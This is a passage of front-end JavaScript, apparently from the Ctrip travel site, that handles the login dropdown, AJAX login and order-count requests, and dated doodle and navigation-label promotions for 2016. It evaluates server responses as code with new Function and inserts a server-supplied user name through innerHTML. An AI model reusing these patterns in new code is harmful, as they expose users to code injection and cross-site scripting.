                    this.onmouseout(document.getElementById('loginDivLi'), function () {
                        document.getElementById('loginDivLi').getElementsByTagName('b')[0].className = "arrow";
                        document.getElementById('loginDiv').style.display = 'none';
                    });
                }
                else {
                    this.onmouseenter(document.getElementById('loginDivLi'), function () {
                        document.getElementById('loginDivLi').getElementsByTagName('b')[0].className = "b_h";
                        document.getElementById('loginDivLi').getElementsByTagName('b')[1].className = "b_h";
                        document.getElementById('loginDiv').style.display = 'block';
                    });
                    this.onmouseout(document.getElementById('loginDivLi'), function () {
                        document.getElementById('loginDivLi').getElementsByTagName('b')[0].className = "";
                        document.getElementById('loginDivLi').getElementsByTagName('b')[1].className = "";
                        document.getElementById('loginDiv').style.display = 'none';
                        document.getElementById('notLoginDiv').style.display = 'none';
                    });
                }

            }
        },
        Func = {
            request: function (url) {
                request(url, {
                    async: true,
                    method: 'POST',
                    onsuccess: function (response) {
                        var isLogin = response.responseText.split('@@')[0];
                        var userName = response.responseText.split('@@')[1];
                        that.isLogin = (new Function("return (" + isLogin + ');'))();
                        if (that.isLogin) {
                            document.getElementById('yetLogin').style.display = '';
                            document.getElementById('notLogin').style.display = 'none';
                            document.getElementById('usernameId').innerHTML = userName + '<br/>我的携程';
                            Func.requestOrder();
                        }
                    }
                });
            },
            requestOrder: function () {
                request(config.url.orderAjax, {
                    async: true,
                    method: 'POST',
                    onsuccess: function (response) {
                        var res = (new Function("return (" + response.responseText + ');'))();
                        document.getElementById('notSubmitBtn').innerHTML = res.UnSubmitOrder;
                        document.getElementById('notTravelBtn').innerHTML = res.WaitAllReviewCount;
                        document.getElementById('notSayBtn').innerHTML = res.NotravelOrder;
                    }
                });
            }
        };
        Event.bindLogin();
        //Func.request(config.url.loginAjax);
    }();
    doLangEvent();
})();

(function () {
    //检测首页doodle设置时间
    var checkOnlineActivity = function (datelist, resultlist) {
        try {
            var dn = new Date();
            var d1;
            var d2;
            for (i = 0; i < datelist.length; i++) {
                d1 = new Date(Date.parse(datelist[i]));
                d2 = new Date(Date.parse(datelist[i + 1]));
                if (dn >= d1 && dn < d2) {
                    return resultlist[i];
                }
            }
        }
        catch (e) { }
        return "0";
    }
    //设置首页doodle
    var pageid = document.getElementById("page_id");
    if (pageid && pageid.value == "100101991") {
        try {
            var datelist = new Array;
            datelist[0] = "2016/06/06 00:00:00";
            datelist[1] = "2016/06/21";
            var resultlist = new Array;
            resultlist[0] = "cui_doudle_disny";//活动上线doodle
            resultlist[1] = "0";//恢复默认
            var result = checkOnlineActivity(datelist, resultlist)
            if (result != "0") {
                var doodlediv = document.getElementById("ctrip_doodle");
                if (doodlediv != null) {
                    doodlediv.className = result;
                }
            }
        }
        catch (e) {
        }
    }
    /**********设置头尾活动*************/
    //创建新标签
    var createTagNew = function (tagtype, tagvalue) {
        var spannode = document.createElement("span");
        var emnode = document.createElement("em");
        var inode = document.createElement("i");
        var textnode = document.createTextNode(tagvalue);
        if (spannode) {
            spannode.className = tagtype;
            if (inode) {
                inode.className = "triangle"
            }
            if (emnode) {
                if (textnode) {
                    emnode.appendChild(textnode);
                    spannode.appendChild(emnode)
                    spannode.appendChild(inode)
                    return spannode;
                }
            }
        }
        return false;
    }

    //检测活动是否处于在线期
    var checkOnlineDate = function (onlinetime, offlinetime) {
        var dn = new Date();
        //console.log(dn);
        var online = new Date(Date.parse(onlinetime));
        var offline = new Date(Date.parse(offlinetime));
        if (dn >= online && dn < offline) {
            return true;
        }
        else {
            return false;
        }
    }
    //检测node节点上角标是否已经存在
    var checkNodeIcon = function (node, text) {
        var chlnodes = node.childNodes;
        if (chlnodes.length > 0) {
            for (var i = 0; i < chlnodes.length; i++) {
                if (chlnodes[i] && (chlnodes[i].textContent == text || chlnodes[i].innerText == text)) {
                    return chlnodes[i];
                }
            }
        }
        return 0;
    }
    //通过id获取node
    var getNodeById = function (id) {
        var p = document.getElementById(id);
        if (!!p) {
            return p;
        }
        return 0;
    }
    //临时下线标签
    var setDisable = function () {
        var config = new Array();
        config[0] = ["c_ph_zhutiyou_v", "2016/03/1", "2016/03/16", "label-en", "NEW"];//二级导航"主题游"<NEW标签>上下线设置
        config[1] = ["c_ph_taocanj_v", "2016/03/1", "2016/03/16", "label-cn", "自驾游"];//二级导航"酒店+景点"<自驾游标签>上下线设置
        try {
            for (var i = 0; i < config.length; i++) {
                var node = getNodeById(config[i][0]);
                if (node == 0) {
                    continue;
                }
                if (checkOnlineDate(config[i][1], config[i][2])) {
                    if (!!checkNodeIcon(node, config[i][4])) {
                        node.removeChild(checkNodeIcon(node, config[i][4]));
                    }
                }
            }
        }
        catch (e) {
        }
    }
    //显示活动入口
    var showNavmenu = function () {
        var config = new Array();
        config[0] = ["c_ph_disney_p", "2016/03/28", "2017/01/01"];//门票“迪士尼”入口
        try {
            for (var i = 0; i < config.length; i++) {
                var node = getNodeById(config[i][0]);
                if (!!node) {
                    var prenode = node.parentNode.previousElementSibling || node.parentNode.previousSibling;
                    if (!checkOnlineDate(config[i][1], config[i][2])) {
                        node.style.display = "none";
                        prenode ? prenode.style.display = "none" : "";
                    }
                    else {
                        node.style.display = "block";
                        prenode ? prenode.style.display = "block" : "";
                    }
                }
            }
        } catch (e) { }

    }

    //设置活动
    var setActivity = function () {
        var config = new Array();
        /*
        参数1:定位id;
        参数2/参数3:上线/下线时间;
        参数4:标签class;
        参数5:标签文案
        */
        config[0] = ["c_ph_zhutiyou_v", "2016/07/01", "2016/08/01", "label-en", "NEW"];//"旅游"下二级导航"主题游"<NEW标签>上下线设置
        config[1] = ["c_ph_youxue_v", "2016/04/12", "2016/07/01", "label-cn", "夏令营"];//"旅游"下二级导航"游学"<夏令营标签>上下线设置
        config[2] = ["c_ph_meeting_h", "2016/04/12", "2016/07/01", "label-cn", "特惠"];//"酒店"下二级导航"会场"<特惠标签>上下线设置
        config[3] = ["c_ph_car", "2016/06/01", "2016/06/26", "label-cn", "大促"];//一级导航【用车】增加“大促”标签
        config[4] = ["c_ph_rizu_c", "2016/04/12", "2016/07/01", "label-cn", "6折"];//二级导航【日租包车】增加“6折”标签
        config[5] = ["c_ph_train", "2016/06/26", "2016/07/18", "label-cn", "台湾"];//火车票一级
        config[6] = ["c_ph_go", "2016/07/18", "2016/08/09", "label-cn", "银联"];//全球购一级
        config[7] = ["c_ph_hwzj_c", "2016/06/17", "2016/08/31", "label-cn", "返20%"];//国际租车
        
        try {
            for (var i = 0; i < config.length; i++) {
                var node = getNodeById(config[i][0]);
                if (node == 0) {
                    continue;
                }
                var newLabel = createTagNew(config[i][3], config[i][4]);
                if (checkOnlineDate(config[i][1], config[i][2])) {
                    if (!checkNodeIcon(node, config[i][4])) {
                        node.appendChild(newLabel);
                    }
                }
                else {
                    if (!!checkNodeIcon(node, config[i][4])) {
                        node.removeChild(checkNodeIcon(node, config[i][4]));
                    }
                }
            }
        }
        catch (e) {
        }
    }
    setActivity();
    showNavmenu();
})();


